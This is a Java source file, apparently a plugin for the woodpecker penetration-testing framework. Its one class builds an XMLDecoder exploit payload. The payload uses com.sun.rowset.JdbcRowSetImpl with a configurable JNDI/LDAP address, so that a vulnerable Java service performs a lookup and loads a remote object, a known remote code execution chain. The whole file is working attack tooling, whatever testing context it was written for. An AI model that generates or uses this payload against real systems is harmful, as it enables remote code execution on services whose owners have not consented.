package me.gv7.woodpecker.plugin.payloads;

import me.gv7.woodpecker.plugin.*;

import java.util.ArrayList;
import java.util.List;
import java.util.Map;

public class JndiInjectPayloadGenerator implements IHelper {
    public String getHelperTabCaption() {
        return "jndi";
    }

    public IArgsUsageBinder getHelperCutomArgs() {
        IArgsUsageBinder argsUsageBinder = XMLDecoderPlugin.pluginHelper.createArgsUsageBinder();
        List<IArg> args = new ArrayList<IArg>();
        IArg args1 = XMLDecoderPlugin.pluginHelper.createArg();
        args1.setName("jndi_address");
        args1.setDefaultValue("ldap://127.0.0.1:138/obj");
        args1.setDescription("jndi地址");
        args1.setRequired(true);
        args.add(args1);
        argsUsageBinder.setArgsList(args);
        return argsUsageBinder;
    }

    public void doHelp(Map<String, Object> customArgs, IResultOutput resultOutput) throws Throwable {
        String jndi_address = (String)customArgs.get("jndi_address");
        String payload = String.format("<java>\n" +
                "    <void class=\"com.sun.rowset.JdbcRowSetImpl\">\n" +
                "        <void property=\"dataSourceName\">\n" +
                "            <string>%s</string>\n" +
                "        </void>\n" +
                "        <void property=\"autoCommit\">\n" +
                "            <boolean>true</boolean>\n" +
                "        </void>\n" +
                "    </void>\n" +
                "</java>",jndi_address);

        resultOutput.rawPrintln("\n" + payload + "\n");
    }
}
